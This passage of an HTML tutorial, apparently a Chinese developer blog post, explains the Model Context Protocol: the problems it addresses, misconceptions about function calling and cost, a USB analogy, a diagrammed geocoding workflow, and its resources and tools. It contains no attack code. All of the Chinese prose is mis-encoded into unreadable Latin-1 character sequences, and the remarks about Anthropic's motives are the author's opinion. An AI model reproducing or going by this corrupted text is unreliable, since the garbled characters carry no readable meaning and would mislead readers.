<li>æ ¼å¼ã€è®¤è¯ã€é”™è¯¯å¤„ç†éƒ½æœ‰ç»Ÿä¸€è§„èŒƒ</li>
</ul>
<p><strong>ç±»æ¯”ç†è§£</strong>ï¼šMCP ä¹‹äº AI å·¥å…·è°ƒç”¨ï¼Œå°±åƒ USB ä¹‹äºæ•°æ®ä¼ è¾“ã€‚</p>
<ul>
<li>æ²¡æœ‰ USB å‰ï¼šæ¯ä¸ªè®¾å¤‡éƒ½æœ‰è‡ªå·±çš„æ¥å£ï¼ˆå„ç§åœ†å£ã€æ–¹å£ã€æ‰å£ï¼‰ï¼Œä¹±ä¸ƒå…«ç³Ÿ</li>
<li>æœ‰äº† USB åï¼šä¸€ä¸ªæ ‡å‡†èµ°å¤©ä¸‹ï¼Œæ’ä¸Šå°±èƒ½ç”¨</li>
</ul>
<hr/>
<h3 data-id="heading-2">1.2 MCP è§£å†³çš„æ ¸å¿ƒé—®é¢˜</h3>
<p>æˆ‘ä»¬ç”¨ä¸€ä¸ªå®é™…åœºæ™¯è¯´æ˜ï¼š</p>
<p><strong>åœºæ™¯</strong>ï¼šä½ åœ¨åšä¸€ä¸ªæ™ºèƒ½å®¢æœç³»ç»Ÿï¼Œéœ€è¦ï¼š</p>
<ol>
<li>æŸ¥è¯¢ç”¨æˆ·è®¢å•çŠ¶æ€ï¼ˆè°ƒç”¨å†…éƒ¨è®¢å•ç³»ç»Ÿ APIï¼‰</li>
<li>æŸ¥è¯¢ç‰©æµä¿¡æ¯ï¼ˆè°ƒç”¨é¡ºä¸°/äº¬ä¸œç‰©æµ APIï¼‰</li>
<li>æŸ¥è¯¢å•†å“åº“å­˜ï¼ˆè°ƒç”¨åº“å­˜ç³»ç»Ÿ APIï¼‰</li>
<li>å‘é€å®¢æœæ¶ˆæ¯ï¼ˆè°ƒç”¨ä¼ä¸šå¾®ä¿¡ APIï¼‰</li>
</ol>
<h4 data-id="heading-3">é—®é¢˜ 1ï¼šæ¥å£æ ¼å¼ä¸ç»Ÿä¸€</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// è®¢å•ç³»ç»Ÿçš„æ¥å£</span>
{
  <span class="hljs-string">"action"</span>: <span class="hljs-string">"query_order"</span>,
  <span class="hljs-string">"params"</span>: {<span class="hljs-string">"order_id"</span>: <span class="hljs-string">"12345"</span>}
}

<span class="hljs-comment">// ç‰©æµç³»ç»Ÿçš„æ¥å£</span>
{
  <span class="hljs-string">"method"</span>: <span class="hljs-string">"trackShipment"</span>,
  <span class="hljs-string">"arguments"</span>: {<span class="hljs-string">"tracking_no"</span>: <span class="hljs-string">"SF123456"</span>}
}

<span class="hljs-comment">// åº“å­˜ç³»ç»Ÿçš„æ¥å£</span>
<span class="hljs-variable constant_">POST</span> /api/inventory/check
<span class="hljs-title class_">Body</span>: {<span class="hljs-string">"sku"</span>: <span class="hljs-string">"PROD-001"</span>, <span class="hljs-string">"warehouse"</span>: <span class="hljs-string">"BJ"</span>}
</code></pre>
<p>æ¯ä¸ªæ¥å£éƒ½ä¸ä¸€æ ·ï¼Œä½ å¾—å†™å¤§é‡çš„é€‚é…ä»£ç ã€‚</p>
<h4 data-id="heading-4">é—®é¢˜ 2ï¼šAI ä¸çŸ¥é“è¯¥è°ƒç”¨å“ªä¸ªå·¥å…·</h4>
<p>AI æ”¶åˆ°ç”¨æˆ·é—®é¢˜"æˆ‘çš„è®¢å•ä»€ä¹ˆæ—¶å€™åˆ°ï¼Ÿ"ï¼Œéœ€è¦åˆ¤æ–­ï¼š</p>
<ul>
<li>è¿™ä¸ªé—®é¢˜éœ€è¦è°ƒç”¨ä»€ä¹ˆå·¥å…·ï¼Ÿ</li>
<li>éœ€è¦å“ªäº›å‚æ•°ï¼Ÿ</li>
<li>å‚æ•°ä»ç”¨æˆ·çš„è¯é‡Œæ€ä¹ˆæå–ï¼Ÿ</li>
</ul>
<p>æ²¡æœ‰ç»Ÿä¸€è§„èŒƒï¼Œæ¯ä¸ªå¼€å‘è€…éƒ½è‡ªå·±å®šä¹‰ï¼Œå¯¼è‡´ï¼š</p>
<ul>
<li>å·¥å…·æè¿°æ ¼å¼ä¸ä¸€è‡´</li>
<li>å‚æ•°å®šä¹‰æ–¹å¼ä¸ä¸€è‡´</li>
<li>AI éš¾ä»¥å‡†ç¡®åˆ¤æ–­</li>
</ul>
<h4 data-id="heading-5">é—®é¢˜ 3ï¼šå›¢é˜Ÿåä½œå›°éš¾</h4>
<ul>
<li>å‰ç«¯å¼€å‘è€…ï¼šåç«¯æ¥å£æ€ä¹ˆè°ƒï¼Ÿå‚æ•°æ ¼å¼æ˜¯ä»€ä¹ˆï¼Ÿ</li>
<li>åç«¯å¼€å‘è€…ï¼šAI ä¼šä¼ ä»€ä¹ˆå‚æ•°è¿‡æ¥ï¼Ÿæ€ä¹ˆå¤„ç†ï¼Ÿ</li>
<li>AI å·¥ç¨‹å¸ˆï¼šå·¥å…·åˆ—è¡¨æ€ä¹ˆç»´æŠ¤ï¼Ÿæç¤ºè¯æ€ä¹ˆå†™ï¼Ÿ</li>
</ul>
<p>ç¼ºä¹æ ‡å‡†ï¼Œæ²Ÿé€šæˆæœ¬å·¨å¤§ã€‚</p>
<hr/>
<p><strong>MCP çš„è§£å†³æ–¹æ¡ˆ</strong>ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-comment">// ç»Ÿä¸€çš„ MCP å·¥å…·å®šä¹‰æ ¼å¼</span>
<span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"query_order"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"description"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"æŸ¥è¯¢è®¢å•çŠ¶æ€"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"inputSchema"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"object"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"properties"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"order_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"string"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"description"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"è®¢å•ID"</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>æ‰€æœ‰å·¥å…·éƒ½æŒ‰è¿™ä¸ªæ ¼å¼å®šä¹‰ï¼ŒAI èƒ½ç»Ÿä¸€å¤„ç†ï¼Œå¼€å‘è€…èƒ½å¿«é€Ÿé›†æˆã€‚</p>
<blockquote>
<p>ğŸ’¡ <strong>Tip</strong>ï¼šMCP ä¸æ˜¯é“¶å¼¹ï¼Œå®ƒåªæ˜¯æŠŠ"è°ƒç”¨å¤–éƒ¨å·¥å…·"è¿™ä»¶äº‹æ ‡å‡†åŒ–äº†ã€‚åŸæœ‰çš„é—®é¢˜ï¼ˆAI åˆ¤æ–­ä¸å‡†ã€å‚æ•°æå–é”™è¯¯ï¼‰å¹¶æ²¡æœ‰æ¶ˆå¤±ã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-6">1.3 ç ´é™¤ä¸‰ä¸ªå¸¸è§è¯¯è§£</h3>
<h4 data-id="heading-7">è¯¯è§£ 1ï¼š"MCP æ˜¯ä¸€ç§æ–°çš„ AI æŠ€æœ¯"</h4>
<p>å¾ˆå¤šæ–‡ç« ä¼šè¯´"MCP æå‡äº† AI çš„å·¥å…·è°ƒç”¨èƒ½åŠ›"ï¼Œè¿™æ˜¯ä¸å‡†ç¡®çš„ã€‚</p>
<p><strong>çœŸç›¸</strong>ï¼šMCP åº•å±‚ç”¨çš„è¿˜æ˜¯ä¼ ç»Ÿçš„ <strong>Function Call</strong>ï¼ˆå·¥å…·è°ƒç”¨ï¼‰ã€‚</p>
<p>çœ‹ä¸€æ®µ MCP å®¢æˆ·ç«¯çš„æ ¸å¿ƒä»£ç ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// MCP å®¢æˆ·ç«¯å†³å®šä½¿ç”¨å“ªä¸ªå·¥å…·</span>
<span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> openai.<span class="hljs-property">chat</span>.<span class="hljs-property">completions</span>.<span class="hljs-title function_">create</span>({
  <span class="hljs-attr">model</span>: <span class="hljs-string">"gpt-4"</span>,
  <span class="hljs-attr">messages</span>: messages,
  <span class="hljs-attr">tools</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">tools</span>  <span class="hljs-comment">// â† è¿™å°±æ˜¯ä¼ ç»Ÿçš„ Function Call å‚æ•°ï¼</span>
});
</code></pre>
<p>MCP åªæ˜¯åœ¨ Function Call å¤–é¢åŒ…äº†ä¸€å±‚æ ‡å‡†åŒ–åè®®ï¼Œ<strong>æ²¡æœ‰æ”¹å˜ AI çš„åˆ¤æ–­èƒ½åŠ›</strong>ã€‚</p>
<p>Function Call åŸæœ‰çš„é—®é¢˜ä¾ç„¶å­˜åœ¨ï¼š</p>
<ul>
<li>âŒ å·¥å…·é€‰æ‹©ä¸å‡†ç¡®ï¼ˆå·¥å…·å¤ªå¤šæ—¶å®¹æ˜“é€‰é”™ï¼‰</li>
<li>âŒ å‚æ•°æå–é”™è¯¯ï¼ˆå¤æ‚å‚æ•°å®¹æ˜“æå–ä¸å‡†ï¼‰</li>
<li>âŒ å¤šæ„å›¾è¯†åˆ«å›°éš¾ï¼ˆä¸€ä¸ªé—®é¢˜æ¶‰åŠå¤šä¸ªå·¥å…·ï¼‰</li>
</ul>
<p><strong>ç»“è®º</strong>ï¼šMCP æ˜¯åè®®æ ‡å‡†åŒ–ï¼Œä¸æ˜¯æŠ€æœ¯çªç ´ã€‚</p>
<hr/>
<h4 data-id="heading-8">è¯¯è§£ 2ï¼š"ç”¨äº† MCP å°±ä¸ç”¨è‡ªå·±å†™å·¥å…·è°ƒç”¨ä»£ç äº†"</h4>
<p>å¾ˆå¤šäººä»¥ä¸º MCP æ˜¯ä»€ä¹ˆ"å¼€ç®±å³ç”¨"çš„è§£å†³æ–¹æ¡ˆï¼Œè£…ä¸Šå°±èƒ½ç”¨ã€‚</p>
<p><strong>çœŸç›¸</strong>ï¼šMCP çš„å·¥ä½œæµç¨‹å’Œä½ è‡ªå·±å®ç° Function Call å‡ ä¹ä¸€æ¨¡ä¸€æ ·ã€‚</p>
<p>å¯¹æ¯”ä¸€ä¸‹ï¼š</p>






























<table><thead><tr><th>å®ç°æ­¥éª¤</th><th>è‡ªå·±å†™ Function Call</th><th>ä½¿ç”¨ MCP</th></tr></thead><tbody><tr><td><strong>1ï¸âƒ£ å®šä¹‰å·¥å…·</strong></td><td>å†™å·¥å…·æè¿° + å‚æ•°å®šä¹‰</td><td>MCP Server å®šä¹‰å·¥å…·ï¼ˆè¿˜æ˜¯è¦å†™ï¼‰</td></tr><tr><td><strong>2ï¸âƒ£ AI å†³ç­–</strong></td><td>è°ƒç”¨ AI çš„ Function Call</td><td>MCP Client è°ƒç”¨ AIï¼ˆè¿˜æ˜¯ Function Callï¼‰</td></tr><tr><td><strong>3ï¸âƒ£ æ‰§è¡Œå·¥å…·</strong></td><td>åç«¯æ¥æ”¶å‚æ•°ï¼Œè°ƒç”¨çœŸå® API</td><td>MCP Server æ‰§è¡Œå¹¶è¿”å›ï¼ˆè¿˜æ˜¯è¦å®ç°ï¼‰</td></tr><tr><td><strong>4ï¸âƒ£ ç”Ÿæˆå›å¤</strong></td><td>æŠŠç»“æœç»™ AI ç”Ÿæˆå›å¤</td><td>MCP Client æŠŠç»“æœç»™ AIï¼ˆé€»è¾‘ä¸€æ ·ï¼‰</td></tr></tbody></table>
<p><strong>æœ¬è´¨ä¸Šæ˜¯ä¸€æ ·çš„</strong>ã€‚</p>
<p>é‚£ MCP çš„ä»·å€¼åœ¨å“ªï¼Ÿç­”æ¡ˆæ˜¯ï¼š<strong>ç”Ÿæ€æ ‡å‡†åŒ–</strong>ã€‚</p>
<p>å½“å¤§å®¶éƒ½æŒ‰åŒä¸€å¥—è§„åˆ™æ¥ï¼š</p>
<ul>
<li>âœ… å·¥å…·èƒ½è·¨é¡¹ç›®å¤ç”¨</li>
<li>âœ… å›¢é˜Ÿåä½œæœ‰ç»Ÿä¸€è§„èŒƒ</li>
<li>âœ… ç¬¬ä¸‰æ–¹å·¥å…·èƒ½æ–¹ä¾¿é›†æˆ</li>
<li>âœ… é™ä½å­¦ä¹ å’Œæ²Ÿé€šæˆæœ¬</li>
</ul>
<p>ä½†å¦‚æœä½ åªæ˜¯ä¸€ä¸ªäººå¼€å‘ï¼Œæˆ–è€…å·¥å…·éƒ½æ˜¯è‡ªå·±çš„å†…éƒ¨ APIï¼ŒMCP çš„ä»·å€¼å°±æ²¡é‚£ä¹ˆå¤§ã€‚</p>
<blockquote>
<p>ğŸ’¡ <strong>Tip</strong>ï¼šæŠŠ MCP ç†è§£æˆ"å·¥å…·è°ƒç”¨çš„æ¥å£æ ‡å‡†"ï¼Œå°±åƒ RESTful API æ˜¯ Web æœåŠ¡çš„æ¥å£æ ‡å‡†ä¸€æ ·ã€‚</p>
</blockquote>
<hr/>
<h4 data-id="heading-9">è¯¯è§£ 3ï¼š"MCP æœåŠ¡éƒ½æ˜¯å…è´¹çš„"</h4>
<p>çœ‹åˆ°å„ç§ MCP Serverï¼ˆé«˜å¾·åœ°å›¾ã€ç™¾åº¦åœ°å›¾ã€å¤©æ°”æœåŠ¡ï¼‰ï¼Œæœ‰äººä»¥ä¸ºè°ƒç”¨æ˜¯å…è´¹çš„ã€‚</p>
<p><strong>çœŸç›¸</strong>ï¼šAPI è°ƒç”¨æˆæœ¬æœ€ç»ˆè¿˜æ˜¯è¦æœ‰äººæ‰¿æ‹…ã€‚</p>
<p>ä»¥é«˜å¾·åœ°å›¾ MCP ä¸ºä¾‹ï¼š</p>
<ol>
<li>ä½ é€šè¿‡ Cursor è°ƒç”¨é«˜å¾·åœ°å›¾ MCP</li>
<li>é«˜å¾·çš„ MCP Server æ”¶åˆ°è¯·æ±‚åï¼Œä¼šè°ƒç”¨é«˜å¾·è‡ªå·±çš„åœ°å›¾ API</li>
<li>è¿™äº› API è°ƒç”¨æ˜¯<strong>è®¡è´¹çš„</strong>ï¼ˆæŒ‰è°ƒç”¨æ¬¡æ•°æˆ–é…é¢ï¼‰</li>
</ol>
<p>æœ‰äº›å¤§å‚çš„ MCP æœåŠ¡æ˜¯å…è´¹çš„ï¼Œä½†é‚£æ˜¯å› ä¸ºï¼š</p>
<ul>
<li>å‰æœŸæŠ•å…¥ï¼Œå¸å¼•å¼€å‘è€…</li>
<li>è°ƒç”¨é‡æœ‰é™åˆ¶ï¼ˆè¶…è¿‡å°±æ”¶è´¹ï¼‰</li>
<li>åŸ¹å…»ç”Ÿæ€ã€è·å–æ•°æ®ã€å é¢†å¸‚åœº</li>
</ul>
<p><strong>å¤©ä¸‹æ²¡æœ‰å…è´¹çš„åˆé¤</strong>ï¼Œåªæ˜¯è°ä»˜è´¹ã€æ€ä¹ˆä»˜è´¹çš„é—®é¢˜ã€‚</p>
<p>å¦‚æœä½ ç”¨ MCP æ¥å…¥æ”¶è´¹æœåŠ¡ï¼Œè¦æ³¨æ„ï¼š</p>
<ul>
<li>âš ï¸ äº†è§£è®¡è´¹è§„åˆ™ï¼ˆæŒ‰æ¬¡æ•°ï¼ŸæŒ‰æµé‡ï¼ŸæŒ‰æ—¶é•¿ï¼Ÿï¼‰</li>
<li>âš ï¸ è®¾ç½®è°ƒç”¨é™é¢ï¼ˆé˜²æ­¢æ„å¤–è¶…æ”¯ï¼‰</li>
<li>âš ï¸ ç›‘æ§ä½¿ç”¨é‡ï¼ˆå®šæœŸæ£€æŸ¥è´¦å•ï¼‰</li>
<li>âš ï¸ è€ƒè™‘ç¼“å­˜ç­–ç•¥ï¼ˆå‡å°‘é‡å¤è°ƒç”¨ï¼‰</li>
</ul>
<hr/>
<h3 data-id="heading-10">1.4 MCP çš„çœŸæ­£ä»·å€¼ï¼šç”Ÿæ€è¯è¯­æƒ</h3>
<p>æ—¢ç„¶ MCP æ²¡æœ‰æŠ€æœ¯åˆ›æ–°ï¼Œä¸ºä»€ä¹ˆ Anthropicï¼ˆClaude çš„æ¯å…¬å¸ï¼‰è¦å¤§åŠ›æ¨ï¼Ÿ</p>
<p>ç­”æ¡ˆæ˜¯ï¼š<strong>äº‰å¤º AI å·¥å…·ç”Ÿæ€çš„è¯è¯­æƒ</strong>ã€‚</p>
<h4 data-id="heading-11">ç±»æ¯”ï¼šUSB æ ‡å‡†çš„æ•…äº‹</h4>
<p>è¿˜è®°å¾— USB æ ‡å‡†æ˜¯æ€ä¹ˆæ¥çš„å—ï¼Ÿ</p>
<p>1990 å¹´ä»£ï¼š</p>
<ul>
<li>é”®ç›˜ç”¨ PS/2 æ¥å£</li>
<li>é¼ æ ‡ç”¨ä¸²å£</li>
<li>æ‰“å°æœºç”¨å¹¶å£</li>
<li>æ‰«æä»ªç”¨ SCSI æ¥å£</li>
<li>æ¯ä¸ªè®¾å¤‡éƒ½ä¸ä¸€æ ·ï¼Œä¹±ä¸ƒå…«ç³Ÿ</li>
</ul>
<p>1996 å¹´ï¼š</p>
<ul>
<li>Intelã€å¾®è½¯ã€IBM ç­‰å·¨å¤´è”åˆæ¨å‡º USB æ ‡å‡†</li>
<li>ä¸€ä¸ªæ¥å£ç»Ÿä¸€æ‰€æœ‰è®¾å¤‡</li>
<li>è°åˆ¶å®šæ ‡å‡†ï¼Œè°å°±æŒæ¡è¯è¯­æƒ</li>
</ul>
<p>ä»Šå¤©ï¼š</p>
<ul>
<li>USB æˆä¸ºäº‹å®æ ‡å‡†</li>
<li>USB-IFï¼ˆUSB æ ‡å‡†åŒ–ç»„ç»‡ï¼‰æŒæ¡ç”Ÿæ€æ§åˆ¶æƒ</li>
<li>æ–°æŠ€æœ¯ï¼ˆType-Cã€USB4ï¼‰éƒ½è¦é€šè¿‡ä»–ä»¬è®¤è¯</li>
</ul>
<h4 data-id="heading-12">MCP æƒ³åšçš„å°±æ˜¯ AI é¢†åŸŸçš„ USB</h4>
<p>Anthropic æ¨ MCP çš„çœŸå®æ„å›¾ï¼š</p>
<ol>
<li><strong>åˆ¶å®šè§„åˆ™</strong>ï¼šè®©å¤§å®¶æŒ‰è‡ªå·±å®šçš„åè®®å¼€å‘</li>
<li><strong>å é¢†ç”Ÿæ€</strong>ï¼šæ‰€æœ‰å·¥å…·æä¾›å•†ã€AI åº”ç”¨éƒ½æ¥å…¥ MCP</li>
<li><strong>è¯è¯­æƒ</strong>ï¼šåœ¨æœªæ¥çš„æ ‡å‡†å§”å‘˜ä¼šä¸­å æ®å…³é”®ä½ç½®</li>
</ol>
<p>å¦‚æœ MCP çœŸçš„æˆä¸ºè¡Œä¸šå…±è¯†ï¼š</p>
<ul>
<li>æ‰€æœ‰æ¨¡å‹çš„å·¥å…·è°ƒç”¨æ ¼å¼å¯èƒ½è¢«ç»Ÿä¸€</li>
<li>Anthropic åœ¨æ ‡å‡†å§”å‘˜ä¼šçš„ä½ç½®ä¸¾è¶³è½»é‡</li>
<li>èƒ½å½±å“æ•´ä¸ª AI å·¥å…·ç”Ÿæ€çš„èµ°å‘</li>
</ul>
<p><strong>å¯¹å¼€å‘è€…æ¥è¯´</strong>ï¼ŒMCP çš„ä»·å€¼åœ¨äºï¼š</p>
<ol>
<li>âœ… <strong>å¿«é€Ÿæ¥å…¥ç°æˆæœåŠ¡</strong>ï¼šä¸ç”¨ç ”ç©¶ API æ–‡æ¡£ï¼Œè£…ä¸ª MCP Server å°±è¡Œ</li>
<li>âœ… <strong>å›¢é˜Ÿåä½œè§„èŒƒ</strong>ï¼šç»Ÿä¸€é…ç½®æ ¼å¼ï¼Œæ–¹ä¾¿ç‰ˆæœ¬æ§åˆ¶</li>
<li>âœ… <strong>å‚ä¸ç”Ÿæ€å»ºè®¾</strong>ï¼šæ—©æœŸå‚ä¸è€…èƒ½å å…ˆæœº</li>
<li>âœ… <strong>é™ä½é›†æˆæˆæœ¬</strong>ï¼šä¸€æ¬¡å¼€å‘ï¼Œåˆ°å¤„è¿è¡Œ</li>
</ol>
<p>ä½†ä¹Ÿè¦è®¤æ¸…ï¼š</p>
<ul>
<li>âš ï¸ MCP è¿˜åœ¨æ—©æœŸï¼Œè§„èŒƒå¯èƒ½å˜åŒ–</li>
<li>âš ï¸ ç”Ÿæ€ä¸å¤Ÿæˆç†Ÿï¼Œå¯ç”¨å·¥å…·æœ‰é™</li>
<li>âš ï¸ ä¸æ˜¯æ‰€æœ‰åœºæ™¯éƒ½é€‚åˆç”¨ MCP</li>
<li>âš ï¸ æ ¸å¿ƒä¸šåŠ¡é€»è¾‘å»ºè®®è‡ªå·±æŒæ§</li>
</ul>
<hr/>
<h2 data-id="heading-13">äºŒã€MCP çš„å·¥ä½œåŸç†</h2>
<p>ç†è§£äº† MCP æ˜¯ä»€ä¹ˆï¼Œæˆ‘ä»¬æ¥çœ‹å®ƒå…·ä½“æ˜¯æ€ä¹ˆå·¥ä½œçš„ã€‚</p>
<h3 data-id="heading-14">2.1 æ ¸å¿ƒå·¥ä½œæµç¨‹</h3>
<p>MCP çš„å·¥ä½œæµç¨‹åˆ†ä¸ºä¸‰æ­¥ï¼Œæˆ‘ä»¬ç”¨ä¸€ä¸ªå®é™…ä¾‹å­è¯´æ˜ï¼š</p>
<p><strong>åœºæ™¯</strong>ï¼šç”¨æˆ·åœ¨ Cursor ä¸­é—® AIï¼š"åŒ—äº¬å¤©å®‰é—¨çš„ç»çº¬åº¦æ˜¯å¤šå°‘ï¼Ÿ"</p>
<pre><code class="hljs language-markdown" lang="markdown">ç¬¬ 1 æ­¥ï¼šç”¨æˆ·æé—®
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   ç”¨æˆ·               â”‚
â”‚  "åŒ—äº¬å¤©å®‰é—¨çš„ç»çº¬   â”‚
â”‚   åº¦æ˜¯å¤šå°‘ï¼Ÿ"        â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
<span class="hljs-code">           â”‚
           â–¼
</span>
ç¬¬ 2 æ­¥ï¼šMCP å®¢æˆ·ç«¯è¯¢é—® AI
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  MCP å®¢æˆ·ç«¯          â”‚
â”‚  (Cursor)           â”‚
â”‚                      â”‚
â”‚  æŠŠé—®é¢˜å’Œå¯ç”¨å·¥å…·    â”‚
â”‚  åˆ—è¡¨å‘ç»™ AIï¼š       â”‚
â”‚  - åœ°ç†ç¼–ç å·¥å…·      â”‚
â”‚  - è·¯å¾„è§„åˆ’å·¥å…·      â”‚
â”‚  - å¤©æ°”æŸ¥è¯¢å·¥å…·      â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
<span class="hljs-code">           â”‚
           â–¼
</span>
ç¬¬ 3 æ­¥ï¼šAI å†³ç­–
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  AI æ¨¡å‹             â”‚
â”‚  (GPT-4/Claude)     â”‚
â”‚                      â”‚
â”‚  åˆ†æåå†³å®šï¼š        â”‚
â”‚  âœ“ ä½¿ç”¨ã€Œåœ°ç†ç¼–ç ã€  â”‚
â”‚    å·¥å…·              â”‚
â”‚  âœ“ å‚æ•°ï¼š            â”‚
â”‚    address=         â”‚
â”‚    "åŒ—äº¬å¤©å®‰é—¨"      â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
<span class="hljs-code">           â”‚
           â–¼
</span>
ç¬¬ 4 æ­¥ï¼šMCP æœåŠ¡ç«¯æ‰§è¡Œ
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  MCP æœåŠ¡ç«¯          â”‚
â”‚  (é«˜å¾·åœ°å›¾ API)     â”‚
â”‚                      â”‚
â”‚  æ”¶åˆ°è¯·æ±‚åï¼š        â”‚
â”‚  1. è°ƒç”¨é«˜å¾·åœ°å›¾API  â”‚
â”‚  2. è·å–åæ ‡æ•°æ®     â”‚
â”‚  3. è¿”å›ç»“æœï¼š       â”‚
â”‚     116.397428,     â”‚
â”‚     39.90923        â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
<span class="hljs-code">           â”‚
           â–¼
</span>
ç¬¬ 5 æ­¥ï¼šAI ç”Ÿæˆå‹å¥½å›å¤
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  ç”¨æˆ·çœ‹åˆ°çš„å›å¤ï¼š    â”‚
â”‚                      â”‚
â”‚  "åŒ—äº¬å¤©å®‰é—¨çš„ç»çº¬   â”‚
â”‚   åº¦æ˜¯ï¼š             â”‚
â”‚   ç»åº¦ï¼š116.397428  â”‚
â”‚   çº¬åº¦ï¼š39.90923"   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<p><strong>å…³é”®ç‚¹</strong>ï¼š</p>
<ul>
<li>MCP å®¢æˆ·ç«¯è´Ÿè´£å’Œ AI æ¨¡å‹é€šä¿¡ï¼ˆè¿™éƒ¨åˆ†ç”¨çš„æ˜¯ Function Callï¼‰</li>
<li>MCP æœåŠ¡ç«¯è´Ÿè´£çœŸæ­£æ‰§è¡Œå·¥å…·é€»è¾‘ï¼ˆè°ƒç”¨çœŸå®çš„ APIï¼‰</li>
<li>ä¸­é—´çš„æ•°æ®ä¼ è¾“æŒ‰ç…§ MCP åè®®æ ‡å‡†è¿›è¡Œ</li>
</ul>
<blockquote>
<p>ğŸ’¡ <strong>Tip</strong>ï¼šMCP æ²¡æœ‰æ”¹å˜ AI çš„å†³ç­–è¿‡ç¨‹ï¼Œåªæ˜¯è§„èŒƒäº†"å·¥å…·åˆ—è¡¨ â†’ AI å†³ç­– â†’ å·¥å…·æ‰§è¡Œ"è¿™ä¸ªæµç¨‹çš„æ•°æ®æ ¼å¼ã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-15">2.2 MCP çš„ä¸‰ä¸ªæ ¸å¿ƒæ¦‚å¿µ</h3>
<p>MCP å®šä¹‰äº†ä¸‰ç§èƒ½åŠ›ç±»å‹ï¼Œç†è§£å®ƒä»¬åªéœ€è®°ä½ï¼š<strong>ç»™ä»€ä¹ˆã€åšä»€ä¹ˆã€æ€ä¹ˆåš</strong>ã€‚</p>
<h4 data-id="heading-16">ğŸ“¦ Resourcesï¼ˆèµ„æºï¼‰â€”â€” ç»™ AI "çœ‹"çš„ä¸œè¥¿</h4>
<p><strong>ç®€å•è¯´</strong>ï¼šåªè¯»çš„æ•°æ®æºï¼ŒAI å¯ä»¥è¯»å–ä½†ä¸èƒ½ä¿®æ”¹ã€‚</p>
<p><strong>å¸¸è§ä¾‹å­</strong>ï¼š</p>
<ul>
<li>æ–‡ä»¶å†…å®¹ï¼ˆä»£ç ã€æ–‡æ¡£ã€é…ç½®ï¼‰</li>
<li>æ•°æ®åº“è®°å½•ï¼ˆç”¨æˆ·æ•°æ®ã€è®¢å•ä¿¡æ¯ï¼‰</li>
<li>API å“åº”ï¼ˆç¬¬ä¸‰æ–¹æœåŠ¡è¿”å›çš„æ•°æ®ï¼‰</li>
</ul>
<p><strong>ä½¿ç”¨åœºæ™¯</strong>ï¼š"åˆ†æä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶æœ‰ä»€ä¹ˆé—®é¢˜" â†’ AI è¯»å–æ–‡ä»¶å†…å®¹ï¼ˆResourceï¼‰â†’ åˆ†æå¹¶ç»™å‡ºå»ºè®®</p>
<hr/>
<h4 data-id="heading-17">ğŸ› ï¸ Toolsï¼ˆå·¥å…·ï¼‰â€”â€” AI èƒ½"åš"çš„äº‹æƒ…</h4>
<p><strong>ç®€å•è¯´</strong>ï¼šå¯æ‰§è¡Œçš„å‡½æ•°ï¼ŒAI è°ƒç”¨åä¼šäº§ç”Ÿå®é™…æ•ˆæœã€‚</p>
<p><strong>å¸¸è§ä¾‹å­</strong>ï¼š</p>
<ul>
<li>æŸ¥è¯¢åœ°ç†åæ ‡ã€è§„åˆ’è·¯çº¿</li>
<li>å‘é€é‚®ä»¶ã€åˆ›å»ºæ—¥å†äº‹ä»¶</li>
<li>è¯»å†™æ•°æ®åº“ã€æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</li>
</ul>
